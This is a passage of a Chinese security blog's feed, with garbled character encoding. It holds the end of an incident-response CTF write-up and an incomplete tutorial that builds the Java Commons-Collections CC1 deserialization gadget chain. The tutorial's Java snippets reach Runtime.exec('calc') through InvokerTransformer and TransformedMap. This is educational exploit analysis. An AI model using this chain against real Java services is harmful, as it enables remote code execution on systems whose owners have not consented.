src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140034813.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å¯¼å‡ºä¸ºbinæ–‡ä»¶ç„¶åä¸¢å¾®æ­¥ä¹‹ç±»çš„çœ‹çœ‹ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140152237.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æ¶æ„æ–‡ä»¶å®é”¤äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d72000ee7388d7d58960db277a91cc40&#125;</span><br></pre></td></tr></table></figure><h2 id="ç»¼åˆåº”æ€¥"><a href="#ç»¼åˆåº”æ€¥" class="headerlink" title="ç»¼åˆåº”æ€¥"></a>ç»¼åˆåº”æ€¥</h2><h3 id="ç»¼åˆåº”æ€¥-1"><a href="#ç»¼åˆåº”æ€¥-1" class="headerlink" title="ç»¼åˆåº”æ€¥-1"></a>ç»¼åˆåº”æ€¥-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šFOGæ—¥å¿—</span><br><span class="line">ç»¼åˆåº”æ€¥-1è¯·ç‚¹å‡»å·¦ä¸Šè§’â€œCTFâ€æŒ‰é’®åˆ‡æ¢ä¸ºâ€œçŸ¥è¯†ç«èµ›â€è¿›è¡Œç­”é¢˜ã€‚é¢˜ç›®ç±»å‹ä¸ºé€‰æ‹©é¢˜ï¼Œæäº¤æœºä¼šåªæœ‰ä¸€æ¬¡ï¼Œè¯·æ…é‡æäº¤ã€‚</span><br><span class="line">æœ¬é¢˜ flagç­”æ¡ˆä¸ºflag&#123;solar&#125;</span><br></pre></td></tr></table></figure><h3 id="ç»¼åˆåº”æ€¥-2"><a href="#ç»¼åˆåº”æ€¥-2" class="headerlink" title="ç»¼åˆåº”æ€¥-2"></a>ç»¼åˆåº”æ€¥-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šFOGæ—¥å¿—</span><br><span class="line">æ”»å‡»è€…ä¸Šä¼ äº†ä»£ç†å·¥å…·ï¼Œè¯·å†™å‡ºä»–çš„æœ€ç»ˆå­˜æ”¾è·¯å¾„</span><br><span class="line">æ ¼å¼ä¸ºflag&#123;x:\xxxxx\xxxx\xxxxxx&#125;</span><br></pre></td></tr></table></figure><p>FOG æ˜¯ä¸€ä¸ªç”¨äºéƒ¨ç½²è®¡ç®—æœºé•œåƒçš„ç®¡ç†å·¥å…·ï¼Œç‰¹åˆ«æ˜¯åœ¨ç½‘ç»œä¸­å¿«é€Ÿéƒ¨ç½²æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºã€‚é€šè¿‡ FOGï¼Œç®¡ç†å‘˜å¯ä»¥å¯¹è®¡ç®—æœºè¿›è¡Œè¿œç¨‹å®‰è£…ã€æ¢å¤å’Œç®¡ç†ã€‚è¿™å¯¹äºå¤§è§„æ¨¡éƒ¨ç½²ã€ç»´æŠ¤å’Œå¤‡ä»½è®¡ç®—æœºéå¸¸æœ‰ç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥å“åº” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–CC1é“¾åˆ†æ</title>
      <link href="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1é“¾-åˆ†æ"><a href="#CC1é“¾-åˆ†æ" class="headerlink" title="CC1é“¾ åˆ†æ"></a>CC1é“¾ åˆ†æ</h1><p><strong>ç¯å¢ƒè¦æ±‚ï¼šjdk8u65ï¼ŒCommons-Collections 3.2.1</strong></p><ul><li>é¦–å…ˆæˆ‘ä»¬å†æ¬¡æ˜ç¡®ä¸€ä¸‹ååºåˆ—åŒ–çš„æ”»å‡»æ€è·¯ã€‚</li></ul><p>å…¥å£ç±»è¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª <code>readObject</code> æ–¹æ³•ï¼Œç»“å°¾è¿™é‡Œéœ€è¦ä¸€ä¸ªèƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ã€‚æˆ‘ä»¬ä¸­é—´é€šè¿‡é“¾å­å¼•å¯¼è¿‡å»ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æ”»å‡»ä¸€å®šæ˜¯ä»å°¾éƒ¨å‡ºå‘å»å¯»æ‰¾å¤´çš„ï¼Œæµç¨‹å›¾å¦‚ä¸‹ã€‚</p><img src="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/AttackRoad.png" alt="img" style="zoom:80%;" /><p><strong>Common-Collectionsä»‹ç»</strong></p><p><a href="http://commons.apache.org/">Apache Commons</a>æ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äº<code>Jakarta</code>é¡¹ç›®ã€‚<code>Commons</code>çš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>Proper</code>ï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€<code>Sandbox</code>ï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’Œ<code>Dormant</code>ï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚</p><ul><li>ç®€å•æ¥è¯´ï¼ŒCommon-Collections è¿™ä¸ªé¡¹ç›®å¼€å‘å‡ºæ¥æ˜¯ä¸ºäº†ç»™ Java æ ‡å‡†çš„ <code>Collections API</code> æä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚</li></ul><h2 id="ç»ˆç‚¹-åˆ©ç”¨ç‚¹"><a href="#ç»ˆç‚¹-åˆ©ç”¨ç‚¹" class="headerlink" title="ç»ˆç‚¹-åˆ©ç”¨ç‚¹"></a>ç»ˆç‚¹-åˆ©ç”¨ç‚¹</h2><p>CC1é“¾çš„æºå¤´å°±æ˜¯Commons Collectionsåº“ä¸­çš„Tranformeræ¥å£ï¼Œè¿™ä¸ªæ¥å£é‡Œé¢æœ‰ä¸ªtransformæ–¹æ³•ã€‚</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20250320183824505.png" class="" title="This is an example image"><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194118934.png" class="" title="This is an example image"><p>å¿«æ·é”®ctrl+alt+Bï¼ŒæŸ¥çœ‹å®ç°æ¥å£çš„ç±»</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194436449.png" class="" title="This is an example image"><p>æˆ‘ä»¬è¿™é‡Œæ‰¾åˆ°äº†æœ‰é‡å†™transformæ–¹æ³•çš„InvokerTransformerç±»ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°å®ƒä¹Ÿç»§æ‰¿äº†Serializable,å¾ˆç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚</p><p>ä¸‹é¢ç»™å‡ºInvokerTransformerç±»çš„æ„é€ å™¨å’Œé‡å†™çš„transformæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The method name to call */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="comment">/** The array of reflection parameter types */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="comment">/** The array of reflection arguments */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = <span class="literal">null</span>;</span><br><span class="line">        iArgs = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™è¾¹çš„å‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼ŒåŒæ—¶é‡å†™çš„transformæ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿™é‡Œæˆ‘ä»¬å›é¡¾ä¸€ä¸‹å¦‚ä½•ç”¨åå°„è°ƒç”¨Runtimeçš„exec</span></span><br><span class="line">Runtime r=Runtime.getRuntime();<span class="comment">//Runtime.getRuntime() æ˜¯ Runtime ç±»ä¸­çš„ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œç”¨æ¥è·å–å½“å‰åº”ç”¨ç¨‹åºè¿è¡Œæ—¶çš„ Runtime å®ä¾‹ã€‚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>=r.getClass();</span><br><span class="line">Method m=c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">m.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥ä¸‹æ¥å°è¯•ç”¨transformæ¥è°ƒç”¨</span></span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(r);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ€»ç»“:æ¯”è¾ƒä¸Šé¢ä¸¤ç§æ–¹å¼ï¼Œä¸‹é¢çš„transformç›¸å½“äºæ¨¡æ‹Ÿäº†ä¸Šè¿°çš„åå°„è¿‡ç¨‹ã€‚</span></span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105195833535.png" class="" title="This is an example image"><p>è¿™é‡ŒæˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œé‚£ä¹ˆç°åœ¨æˆ‘ä»¬å·²ç»å¯»åˆ°å…¥å£ç‚¹äº†ï¼Œæ¥ä¸‹æ¥éœ€è¦ä¸€æ­¥æ­¥å›æº¯ï¼Œå¯»æ‰¾åˆé€‚çš„å­ç±»ï¼Œæ„é€ æ¼æ´é“¾ï¼Œç›´åˆ°åˆ°è¾¾é‡å†™äº†readObjectçš„ç±»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬ä¸‹ä¸€æ­¥çš„ç›®æ ‡æ˜¯å»æ‰¾è°ƒç”¨ <code>transform</code> æ–¹æ³•çš„ä¸åŒåå‡½æ•°ã€‚</p><h2 id="æ„é€ é“¾å­ç¬¬ä¸€æ­¥-å¯»æ‰¾transformè°ƒç”¨å¤„"><a href="#æ„é€ é“¾å­ç¬¬ä¸€æ­¥-å¯»æ‰¾transformè°ƒç”¨å¤„" class="headerlink" title="æ„é€ é“¾å­ç¬¬ä¸€æ­¥-å¯»æ‰¾transformè°ƒç”¨å¤„"></a>æ„é€ é“¾å­ç¬¬ä¸€æ­¥-å¯»æ‰¾transformè°ƒç”¨å¤„</h2><p><strong>å¯»æ‰¾å“ªäº›ç±»ä¸­çš„å“ªäº›æ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³•</strong></p><p>å³é”®æŸ¥çœ‹ç”¨æ³•å³å¯</p><p>é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œç›´æ¥çœ‹åˆ°æˆ‘ä»¬éœ€è¦çš„TransformedMapç±»ä¸‹çš„checkSetValueæ–¹æ³•</p><p>ä¸‹é¢æˆ‘ä»¬ç›´æ¥ç»™å‡ºæ„é€ å™¨å’ŒcheckSetValueæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#TransformedMap.java   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">   &#125;<span class="comment">//æ¥å—å‚æ•°ï¼Œå®ä¾‹åŒ–TransformedMapè¿™ä¸ªç±»</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(map);</span><br><span class="line">       <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">       <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">   &#125;<span class="comment">//æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºMap,æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¹‹å‰è®²åˆ°çš„HashMap,ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå°±æ˜¯Transformeræˆ‘ä»¬éœ€è¦çš„äº†ï¼Œå¯æ§ã€‚</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;<span class="comment">//è¿”å›valueTransformerå¯¹åº”çš„transformæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå°±éœ€è¦è®©valueTransformerä¸ºæˆ‘ä»¬ä¹‹å‰çš„invokerTransformerå¯¹è±¡ã€‚ç›¸å½“äºå°±æ˜¯è®©è¿™é‡Œçš„valueTransformer=invokerTransformerï¼ï¼ï¼</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å‘ç°æ„é€ å™¨å’ŒcheckSetValueæ–¹æ³•éƒ½æ˜¯protectedæƒé™çš„ï¼Œåªèƒ½æœ¬ç±»å†…éƒ¨è®¿é—®ï¼Œæ— æ³•å¤–éƒ¨è°ƒç”¨å’Œå®ä¾‹åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å†…éƒ¨å®ä¾‹åŒ–çš„å·¥å…·ã€‚ä¹Ÿå°±æ˜¯ä¸Šé¢çš„ä¸€ä¸ªpublicé™æ€æ–¹æ³•decorateã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨decorateæ–¹æ³•æ¥å®ä¾‹åŒ–TransformedMapç±»ï¼Œç„¶åå†æƒ³åŠæ³•è°ƒç”¨checkSetValueæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//é™æ€æ–¹æ³•staicä¿®é¥°ç›´æ¥ç±»åï¼‹æ–¹æ³•åè°ƒç”¨</span></span><br><span class="line"><span class="comment">//æŠŠmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°æˆ‘ä»¬ç”¨ä¸ç€å°±èµ‹ç©ºå€¼null,ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„invokerTransformer.</span></span><br><span class="line">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">checkSetValueMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">checkSetValueMethod.invoke(transformedmap,r);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105202442609.png" class="" title="This is an example image"><h2 id="æ„é€ é“¾å­ç¬¬äºŒæ­¥-å¯»æ‰¾checkSetValueè°ƒç”¨å¤„"><a href="#æ„é€ é“¾å­ç¬¬äºŒæ­¥-å¯»æ‰¾checkSetValueè°ƒç”¨å¤„" class="headerlink" title="æ„é€ é“¾å­ç¬¬äºŒæ­¥-å¯»æ‰¾checkSetValueè°ƒç”¨å¤„"></a>æ„é€ é“¾å­ç¬¬äºŒæ­¥-å¯»æ‰¾checkSetValueè°ƒç”¨å¤„</h2><p>checkSetValueå¯»æ‰¾ç”¨æ³•ï¼Œå‘ç°åªæœ‰ä¸€å¤„è°ƒç”¨äº†checkSetValue(AbstractInputCheckedMapDecoratorç±»çš„setValue)</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105204710172.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** The parent map */</span></span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">           <span class="built_in">super</span>(entry);</span><br><span class="line">           <span class="built_in">this</span>.parent = parent;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">           value = parent.checkSetValue(value);</span><br><span class="line">           <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Entryä»£è¡¨çš„æ˜¯Mapä¸­çš„ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè€Œæˆ‘ä»¬åœ¨Mapä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰setValueæ–¹æ³•ï¼Œè€Œæˆ‘ä»¬åœ¨å¯¹Mapè¿›è¡Œéå†çš„æ—¶å€™å¯ä»¥è°ƒç”¨setValueè¿™ä¸ªæ–¹æ³•</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105205232375.png" class="" title="This is an example image"><p>è€Œä¸Šé¢å‰¯ç±»MapEntryå®é™…ä¸Šæ˜¯é‡å†™äº†setValueæ–¹æ³•ï¼Œå®ƒç»§æ‰¿äº†AbstractMapEntryDecoratorè¿™ä¸ªç±»ï¼Œè¿™ä¸ªç±»ä¸­å­˜åœ¨setValueæ–¹æ³•ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMapEntryDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Map.Entry entry;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªç±»åˆå¼•å…¥äº†Map.Entryæ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¸¸ç”¨çš„Mapéå†ï¼Œå°±å¯ä»¥è°ƒç”¨setValueæ–¹æ³•,ç„¶åæ°´åˆ°æ¸ æˆåœ°è°ƒç”¨checkSetValueæ–¹æ³•:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// invokerTransformer.transform(r); &lt;--- ç›¸å½“äºä¸‹é¢çš„ä»£ç æ˜¯æ¨¡æ‹Ÿè¿™è¡Œä»£ç ï¼Œå®ç°ç›¸åŒçš„åŠŸèƒ½</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//åé¢æ˜¯è¦è°ƒç”¨checkSetValueæ–¹æ³•ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡éå†Mapæ¥è°ƒç”¨setValueæ–¹æ³•,ç„¶åæ°´åˆ°æ¸ æˆè°ƒç”¨checkSetValueæ–¹æ³•</span></span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;<span class="comment">//éå†Mapå¸¸ç”¨æ ¼å¼</span></span><br><span class="line">    entry.setValue(r);<span 